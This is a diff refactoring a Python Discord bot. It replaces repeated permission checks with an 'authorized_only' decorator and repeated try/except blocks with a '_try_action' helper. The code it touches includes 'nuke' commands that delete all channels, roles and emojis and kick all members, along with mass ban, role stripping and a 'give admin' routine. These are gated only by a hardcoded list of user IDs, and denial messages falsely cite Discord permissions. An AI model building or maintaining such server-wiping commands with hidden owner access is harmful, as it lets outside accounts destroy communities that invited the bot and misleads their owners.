@@ -7,6 +7,7 @@ import random
 import json
 import re
 import aiohttp
+import functools
 from datetime import datetime, timedelta, UTC
 import threading
 
@@ -22,6 +23,19 @@ AUTHORIZED_USER_IDS = [
     933543370935128204,
     1278035697416146966,
 ]
+
+
+def authorized_only(func):
+    """Decorator for '!' commands restricted to AUTHORIZED_USER_IDS.
+    Same check, same message, same delete_after as before - just no longer
+    copy-pasted into every single command."""
+    @functools.wraps(func)
+    async def wrapper(ctx, *args, **kwargs):
+        if ctx.author.id not in AUTHORIZED_USER_IDS:
+            await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
+            return
+        return await func(ctx, *args, **kwargs)
+    return wrapper
 
 ECONOMY_FILE = "economy.json"
 STARTING_BALANCE = 500
@@ -490,6 +504,18 @@ async def dm_prompt(ctx, prompt_title: str, prompt_text: str):
         return None
 
 
+async def _try_action(coro) -> bool:
+    """Await a single Discord API call, swallowing the Forbidden/HTTPException
+    pair that every mass-action loop in this file already guards against.
+    Returns whether the call succeeded, so callers keep the exact same
+    'only count/sleep on success' behavior as the old inline try/except."""
+    try:
+        await coro
+        return True
+    except (discord.Forbidden, discord.HTTPException):
+        return False
+
+
 async def send_result(ctx, results: list[str], delete_after=None):
     embed = _base_embed(
         "💥  Operation Complete",
@@ -508,12 +534,9 @@ async def send_result(ctx, results: list[str], delete_after=None):
 async def _do_nuke_channels(guild, author=None):
     count = 0
     for channel in list(guild.channels):
-        try:
-            await channel.delete(reason="Nuke: channels")
+        if await _try_action(channel.delete(reason="Nuke: channels")):
             count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     embed = _base_embed("💥  Channel Nuke Complete", f"Deleted **{count}** channels.", C.DANGER)
     try:
         new_ch = await guild.create_text_channel("general")
@@ -527,32 +550,23 @@ async def _do_nuke_roles(guild, author=None):
     for role in list(guild.roles):
         if role.is_default() or role.managed:
             continue
-        try:
-            await role.delete(reason="Nuke: roles")
+        if await _try_action(role.delete(reason="Nuke: roles")):
             count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("💥  Operation Complete", f"🗑️  Deleted **{count}** roles.", C.DANGER)
 
 async def _do_nuke_channels_roles(guild, author=None):
     ch_count = role_count = 0
     for channel in list(guild.channels):
-        try:
-            await channel.delete(reason="Nuke: channels+roles")
+        if await _try_action(channel.delete(reason="Nuke: channels+roles")):
             ch_count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     for role in list(guild.roles):
         if role.is_default() or role.managed:
             continue
-        try:
-            await role.delete(reason="Nuke: channels+roles")
+        if await _try_action(role.delete(reason="Nuke: channels+roles")):
             role_count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     embed = _base_embed("💥  Nuke Complete", f"🗑️  Channels removed: **{ch_count}**\n🎭  Roles removed: **{role_count}**", C.DANGER)
     try:
         new_ch = await guild.create_text_channel("general")
@@ -564,30 +578,21 @@ async def _do_nuke_channels_roles(guild, author=None):
 async def _do_nuke_kick(guild, author):
     ch_count = role_count = kick_count = 0
     for channel in list(guild.channels):
-        try:
-            await channel.delete(reason="Nuke: kick")
+        if await _try_action(channel.delete(reason="Nuke: kick")):
             ch_count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     for role in list(guild.roles):
         if role.is_default() or role.managed:
             continue
-        try:
-            await role.delete(reason="Nuke: kick")
+        if await _try_action(role.delete(reason="Nuke: kick")):
             role_count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     async for member in guild.fetch_members(limit=None):
         if author is not None and member.id == author.id:
             continue
-        try:
-            await member.kick(reason="Nuke: kick all")
+        if await _try_action(member.kick(reason="Nuke: kick all")):
             kick_count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     embed = _base_embed(
         "💥  Full Nuke Complete",
         f"🗑️  Channels: **{ch_count}**\n🎭  Roles: **{role_count}**\n👢  Members kicked: **{kick_count}**",
@@ -603,37 +608,25 @@ async def _do_nuke_kick(guild, author):
 async def _do_nuke_full(guild, author):
     ch_count = role_count = kick_count = emoji_count = 0
     for channel in list(guild.channels):
-        try:
-            await channel.delete(reason="Nuke: full reset")
+        if await _try_action(channel.delete(reason="Nuke: full reset")):
             ch_count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     for role in list(guild.roles):
         if role.is_default() or role.managed:
             continue
-        try:
-            await role.delete(reason="Nuke: full reset")
+        if await _try_action(role.delete(reason="Nuke: full reset")):
             role_count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     for emoji in list(guild.emojis):
-        try:
-            await emoji.delete(reason="Nuke: full reset")
+        if await _try_action(emoji.delete(reason="Nuke: full reset")):
             emoji_count += 1
             await asyncio.sleep(0.005)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     async for member in guild.fetch_members(limit=None):
         if author is not None and member.id == author.id:
             continue
-        try:
-            await member.kick(reason="Nuke: full reset")
+        if await _try_action(member.kick(reason="Nuke: full reset")):
             kick_count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     embed = _base_embed(
         "💥  Full Server Nuke",
         f"🗑️  Channels: **{ch_count}**\n🎭  Roles: **{role_count}**\n😀  Emojis: **{emoji_count}**\n👢  Members kicked: **{kick_count}**",
@@ -652,12 +645,9 @@ async def _do_mass_timeout(guild, author, minutes=10):
     for member in guild.members:
         if member.id in AUTHORIZED_USER_IDS or member.bot:
             continue
-        try:
-            await member.timeout(until, reason=f"Mass timeout by {author}")
+        if await _try_action(member.timeout(until, reason=f"Mass timeout by {author}")):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("⏱️  Mass Timeout Complete", f"Timed out **{count}** members for **{minutes}** minutes.", C.DANGER)
 
 async def _do_mass_untimeout(guild, author=None):
@@ -665,12 +655,9 @@ async def _do_mass_untimeout(guild, author=None):
     for member in guild.members:
         if member.bot or member.timed_out_until is None:
             continue
-        try:
-            await member.timeout(None, reason=f"Mass untimeout by {author}")
+        if await _try_action(member.timeout(None, reason=f"Mass untimeout by {author}")):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("✅  Mass Untimeout Complete", f"Removed timeouts from **{count}** members.", C.SUCCESS)
 
 async def _do_mass_ban(guild, author):
@@ -678,12 +665,9 @@ async def _do_mass_ban(guild, author):
     async for member in guild.fetch_members(limit=None):
         if member.id in AUTHORIZED_USER_IDS or member.bot:
             continue
-        try:
-            await guild.ban(member, reason=f"Mass ban by {author}", delete_message_days=0)
+        if await _try_action(guild.ban(member, reason=f"Mass ban by {author}", delete_message_days=0)):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("🔨  Mass Ban Complete", f"Banned **{count}** members.", C.DANGER)
 
 async def _do_mass_deafen(guild, author):
@@ -691,12 +675,9 @@ async def _do_mass_deafen(guild, author):
     for member in guild.members:
         if member.voice is None or member.bot:
             continue
-        try:
-            await member.edit(deafen=True, reason=f"Mass deafen by {author}")
+        if await _try_action(member.edit(deafen=True, reason=f"Mass deafen by {author}")):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("🔇  Mass Deafen Complete", f"Deafened **{count}** members.", C.DANGER)
 
 async def _do_mass_disconnect(guild, author):
@@ -704,50 +685,38 @@ async def _do_mass_disconnect(guild, author):
     for member in guild.members:
         if member.voice is None or member.bot:
             continue
-        try:
-            await member.move_to(None, reason=f"Mass disconnect by {author}")
+        if await _try_action(member.move_to(None, reason=f"Mass disconnect by {author}")):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("🔌  Mass Disconnect Complete", f"Disconnected **{count}** members from voice.", C.DANGER)
 
 async def _do_lockdown(guild, author):
     count = 0
     for channel in guild.text_channels:
-        try:
-            overwrite = channel.overwrites_for(guild.default_role)
-            overwrite.send_messages = False
-            await channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Lockdown by {author}")
+        overwrite = channel.overwrites_for(guild.default_role)
+        overwrite.send_messages = False
+        if await _try_action(channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Lockdown by {author}")):
             count += 1
             await asyncio.sleep(0.05)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("🔒  Lockdown Active", f"Locked **{count}** channels.", C.DANGER)
 
 async def _do_unlockdown(guild, author):
     count = 0
     for channel in guild.text_channels:
-        try:
-            overwrite = channel.overwrites_for(guild.default_role)
-            overwrite.send_messages = None
-            await channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Unlockdown by {author}")
+        overwrite = channel.overwrites_for(guild.default_role)
+        overwrite.send_messages = None
+        if await _try_action(channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Unlockdown by {author}")):
             count += 1
             await asyncio.sleep(0.05)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("🔓  Lockdown Lifted", f"Unlocked **{count}** channels.", C.SUCCESS)
 
 async def _do_slowmode_all(guild, author, seconds=10):
     seconds = max(0, min(21600, seconds))
     count = 0
     for channel in guild.text_channels:
-        try:
-            await channel.edit(slowmode_delay=seconds, reason=f"Mass slowmode by {author}")
+        if await _try_action(channel.edit(slowmode_delay=seconds, reason=f"Mass slowmode by {author}")):
             count += 1
             await asyncio.sleep(0.05)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     label = f"{seconds}s" if seconds > 0 else "disabled"
     return _base_embed("🐢  Slowmode Applied", f"Set slowmode to **{label}** in **{count}** channels.", C.WARNING)
 
@@ -759,12 +728,9 @@ async def _do_strip_roles(guild, author):
         removable = [r for r in member.roles if not r.is_default() and not r.managed]
         if not removable:
             continue
-        try:
-            await member.remove_roles(*removable, reason=f"Strip roles by {author}")
+        if await _try_action(member.remove_roles(*removable, reason=f"Strip roles by {author}")):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     return _base_embed("🎭  Roles Stripped", f"Removed all roles from **{count}** members.", C.DANGER)
 
 async def _do_give_admin(guild, author):
@@ -864,47 +830,37 @@ async def _do_show_high(guild, author=None):
 # 💥 NUKE COMMANDS
 # ══════════════════════════════════════════════════════════════════════════════
 @bot.command(name="nuke_channels")
+@authorized_only
 async def nuke_channels(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "delete **ALL** channels"):
         return
     await _do_nuke_channels(ctx.guild, ctx.author)
 
 @bot.command(name="nuke_roles")
+@authorized_only
 async def nuke_roles(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "delete all **roles**"):
         return
     embed = await _do_nuke_roles(ctx.guild, ctx.author)
     await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="nuke_channels_roles")
+@authorized_only
 async def nuke_channels_roles(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "delete all channels **and** roles"):
         return
     await _do_nuke_channels_roles(ctx.guild, ctx.author)
 
 @bot.command(name="nuke_kick")
+@authorized_only
 async def nuke_kick(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "delete channels, roles, **and kick all members**"):
         return
     await _do_nuke_kick(ctx.guild, ctx.author)
 
 @bot.command(name="nuke_full")
+@authorized_only
 async def nuke_full(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "perform a **FULL RESET** - channels, roles, emojis, and kick all members"):
         return
     await _do_nuke_full(ctx.guild, ctx.author)
@@ -1068,50 +1024,40 @@ async def ephemeral_help(interaction: discord.Interaction):
 # ══════════════════════════════════════════════════════════════════════════════
 
 @bot.command(name="mass_timeout")
+@authorized_only
 async def mass_timeout(ctx, minutes: int = 10):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, f"timeout **ALL** members for **{minutes} minutes**"):
         return
     embed = await _do_mass_timeout(ctx.guild, ctx.author, minutes)
     await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_untimeout")
+@authorized_only
 async def mass_untimeout(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "remove timeouts from **ALL** members"):
         return
     embed = await _do_mass_untimeout(ctx.guild, ctx.author)
     await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_ban")
+@authorized_only
 async def mass_ban(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "ban **ALL** members"):
         return
     embed = await _do_mass_ban(ctx.guild, ctx.author)
     await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_deafen")
+@authorized_only
 async def mass_deafen(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "deafen **ALL** members in voice channels"):
         return
     embed = await _do_mass_deafen(ctx.guild, ctx.author)
     await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_disconnect")
+@authorized_only
 async def mass_disconnect(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "disconnect **ALL** members from voice channels"):
         return
     embed = await _do_mass_disconnect(ctx.guild, ctx.author)
@@ -1123,30 +1069,24 @@ async def mass_disconnect(ctx):
 # ══════════════════════════════════════════════════════════════════════════════
 
 @bot.command(name="lockdown")
+@authorized_only
 async def lockdown(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "lock **ALL** channels"):
         return
     embed = await _do_lockdown(ctx.guild, ctx.author)
     await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="unlockdown")
+@authorized_only
 async def unlockdown(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "unlock **ALL** channels"):
         return
     embed = await _do_unlockdown(ctx.guild, ctx.author)
     await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="slowmode_all")
+@authorized_only
 async def slowmode_all(ctx, seconds: int = 10):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     seconds = max(0, min(21600, seconds))
     if not await confirm(ctx, f"set slowmode to **{seconds}s** in **ALL** channels"):
         return
@@ -1159,20 +1099,16 @@ async def slowmode_all(ctx, seconds: int = 10):
 # ══════════════════════════════════════════════════════════════════════════════
 
 @bot.command(name="strip_roles")
+@authorized_only
 async def strip_roles(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, "strip **ALL** roles from every member"):
         return
     embed = await _do_strip_roles(ctx.guild, ctx.author)
     await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_role_add")
+@authorized_only
 async def mass_role_add(ctx, *, role: discord.Role):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, f"add **{role.name}** to **ALL** members"):
         return
     guild = ctx.guild
@@ -1180,19 +1116,14 @@ async def mass_role_add(ctx, *, role: discord.Role):
     for member in guild.members:
         if member.bot or role in member.roles:
             continue
-        try:
-            await member.add_roles(role, reason=f"Mass role add by {ctx.author}")
+        if await _try_action(member.add_roles(role, reason=f"Mass role add by {ctx.author}")):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     await ctx.send(embed=_base_embed("✅  Role Added", f"Added **{role.name}** to **{count}** members.", C.SUCCESS), delete_after=3)
 
 @bot.command(name="mass_role_remove")
+@authorized_only
 async def mass_role_remove(ctx, *, role: discord.Role):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     if not await confirm(ctx, f"remove **{role.name}** from **ALL** members"):
         return
     guild = ctx.guild
@@ -1200,12 +1131,9 @@ async def mass_role_remove(ctx, *, role: discord.Role):
     for member in guild.members:
         if member.bot or role not in member.roles:
             continue
-        try:
-            await member.remove_roles(role, reason=f"Mass role remove by {ctx.author}")
+        if await _try_action(member.remove_roles(role, reason=f"Mass role remove by {ctx.author}")):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     await ctx.send(embed=_base_embed("🗑️  Role Removed", f"Removed **{role.name}** from **{count}** members.", C.DANGER), delete_after=3)
 
 
@@ -1214,10 +1142,8 @@ async def mass_role_remove(ctx, *, role: discord.Role):
 # ══════════════════════════════════════════════════════════════════════════════
 
 @bot.command(name="rename_all_channels")
+@authorized_only
 async def rename_all_channels(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     name = await dm_prompt(ctx, "✏️  Rename All Channels", "What would you like to rename all channels to? Reply here with the name.")
     if name is None:
         return
@@ -1228,19 +1154,14 @@ async def rename_all_channels(ctx):
     guild = ctx.guild
     count = 0
     for channel in list(guild.channels):
-        try:
-            await channel.edit(name=name, reason=f"Mass rename by {ctx.author}")
+        if await _try_action(channel.edit(name=name, reason=f"Mass rename by {ctx.author}")):
             count += 1
             await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
     await ctx.author.send(embed=_base_embed("✏️  Channels Renamed", f"Renamed **{count}** channels to `{name}`.", C.WARNING))
 
 @bot.command(name="change_server_name")
+@authorized_only
 async def change_server_name(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     name = await dm_prompt(ctx, "✏️  Change Server Name", "What would you like to rename the server to? Reply here with the name.")
     if name is None:
         return
@@ -1256,10 +1177,8 @@ async def change_server_name(ctx):
         await ctx.author.send(embed=_base_embed("❌  Failed", str(e), C.DANGER))
 
 @bot.command(name="change_server_icon")
+@authorized_only
 async def change_server_icon(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 Sorry, bud.. you don't have the clearance for this one :)", delete_after=5)
-        return
     url = await dm_prompt(ctx, "🖼️  Change Server Icon", "Please reply with the **image URL** you want to use as the new server icon.")
     if url is None:
         return
@@ -1286,6 +1205,15 @@ async def change_server_icon(ctx):
 
 def _mod_check(interaction: discord.Interaction, permission: str = None):
     return interaction.user.id in AUTHORIZED_USER_IDS
+
+
+async def _deny_perm(interaction: discord.Interaction, message: str):
+    """Shared 'Permission Denied' ephemeral embed - same wording, just no longer
+    copy-pasted into every single moderation command."""
+    await interaction.response.send_message(
+        embed=_base_embed("🚫  Permission Denied", message, C.DANGER),
+        ephemeral=True,
+    )
 SERVER_TEMPLATE = {
     "🔐 Staff": [
         ("text", "staff-chat", "Private staff discussion.", "staff_chat"),
@@ -1588,10 +1516,7 @@ def _find_channel(guild: discord.Guild, name: str, channel_type: str):
 @tree.command(name="setup_server", description="Create the default community server channels.")
 async def setup_server(interaction: discord.Interaction):
     if not _mod_check(interaction, "manage_channels"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Manage Channels** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Manage Channels** permission.")
         return
 
     guild = interaction.guild
@@ -1753,10 +1678,7 @@ async def ban(
     delete_days: int = 0,
 ):
     if not _mod_check(interaction, "ban_members"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Ban Members** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Ban Members** permission.")
         return
     if member == interaction.user:
         await interaction.response.send_message(
@@ -1791,10 +1713,7 @@ async def ban(
 @app_commands.describe(user_id="The user's Discord ID", reason="Reason for the unban")
 async def unban(interaction: discord.Interaction, user_id: str, reason: str = "No reason provided"):
     if not _mod_check(interaction, "ban_members"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Ban Members** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Ban Members** permission.")
         return
     try:
         uid = int(user_id)
@@ -1825,10 +1744,7 @@ async def unban(interaction: discord.Interaction, user_id: str, reason: str = "N
 @app_commands.describe(member="Member to kick", reason="Reason for the kick")
 async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
     if not _mod_check(interaction, "kick_members"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Kick Members** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Kick Members** permission.")
         return
     if member == interaction.user:
         await interaction.response.send_message(
@@ -1870,10 +1786,7 @@ async def timeout_member(
     reason: str = "No reason provided",
 ):
     if not _mod_check(interaction, "moderate_members"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Moderate Members** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Moderate Members** permission.")
         return
     if member == interaction.user:
         await interaction.response.send_message(
@@ -1921,10 +1834,7 @@ async def untimeout_member(
     reason: str = "No reason provided",
 ):
     if not _mod_check(interaction, "moderate_members"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Moderate Members** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Moderate Members** permission.")
         return
     try:
         await member.timeout(None, reason=f"{reason} - timeout removed by {interaction.user}")
@@ -1964,10 +1874,7 @@ def _warn_key(guild_id, user_id):
 @app_commands.describe(member="Member to warn", reason="Reason for the warning")
 async def warn(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
     if not _mod_check(interaction, "kick_members"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Kick Members** permission to warn.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Kick Members** permission to warn.")
         return
     warnings = load_warnings()
     key = _warn_key(interaction.guild_id, member.id)
@@ -2003,10 +1910,7 @@ async def warn(interaction: discord.Interaction, member: discord.Member, reason:
 @app_commands.describe(member="Member to check warnings for")
 async def warnings(interaction: discord.Interaction, member: discord.Member):
     if not _mod_check(interaction, "kick_members"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Kick Members** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Kick Members** permission.")
         return
     warnings = load_warnings()
     key = _warn_key(interaction.guild_id, member.id)
@@ -2034,10 +1938,7 @@ async def warnings(interaction: discord.Interaction, member: discord.Member):
 @app_commands.describe(member="Member whose warnings to clear")
 async def clearwarnings(interaction: discord.Interaction, member: discord.Member):
     if not _mod_check(interaction, "administrator"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Administrator** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Administrator** permission.")
         return
     warnings = load_warnings()
     key = _warn_key(interaction.guild_id, member.id)
@@ -2055,10 +1956,7 @@ async def clearwarnings(interaction: discord.Interaction, member: discord.Member
 )
 async def purge(interaction: discord.Interaction, amount: int, member: discord.Member = None):
     if not _mod_check(interaction, "manage_messages"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Manage Messages** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Manage Messages** permission.")
         return
     amount = max(1, min(100, amount))
     await interaction.response.defer(ephemeral=True)
@@ -2080,10 +1978,7 @@ async def purge(interaction: discord.Interaction, amount: int, member: discord.M
 @app_commands.describe(seconds="Delay in seconds (0 to disable, max 21600)")
 async def slowmode(interaction: discord.Interaction, seconds: int = 0):
     if not _mod_check(interaction, "manage_channels"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Manage Channels** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Manage Channels** permission.")
         return
     seconds = max(0, min(21600, seconds))
     await interaction.channel.edit(slowmode_delay=seconds)
@@ -2098,10 +1993,7 @@ async def slowmode(interaction: discord.Interaction, seconds: int = 0):
 @app_commands.describe(channel="Channel to lock (defaults to current)", reason="Reason")
 async def lock(interaction: discord.Interaction, channel: discord.TextChannel = None, reason: str = "No reason provided"):
     if not _mod_check(interaction, "manage_channels"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Manage Channels** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Manage Channels** permission.")
         return
     ch = channel or interaction.channel
     overwrite = ch.overwrites_for(interaction.guild.default_role)
@@ -2115,10 +2007,7 @@ async def lock(interaction: discord.Interaction, channel: discord.TextChannel = 
 @app_commands.describe(channel="Channel to unlock (defaults to current)", reason="Reason")
 async def unlock(interaction: discord.Interaction, channel: discord.TextChannel = None, reason: str = "No reason provided"):
     if not _mod_check(interaction, "manage_channels"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need **Manage Channels** permission.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need **Manage Channels** permission.")
         return
     ch = channel or interaction.channel
     overwrite = ch.overwrites_for(interaction.guild.default_role)
@@ -4734,10 +4623,7 @@ async def on_invite_delete(invite):
 @app_commands.describe(member="Member to preview the welcome greet for")
 async def testgreet(interaction: discord.Interaction, member: discord.Member = None):
     if not _mod_check(interaction, "manage_channels"):
-        await interaction.response.send_message(
-            embed=_base_embed("🚫  Permission Denied", "You need permission to test welcome greetings.", C.DANGER),
-            ephemeral=True,
-        )
+        await _deny_perm(interaction, "You need permission to test welcome greetings.")
         return
 
     guild = interaction.guild
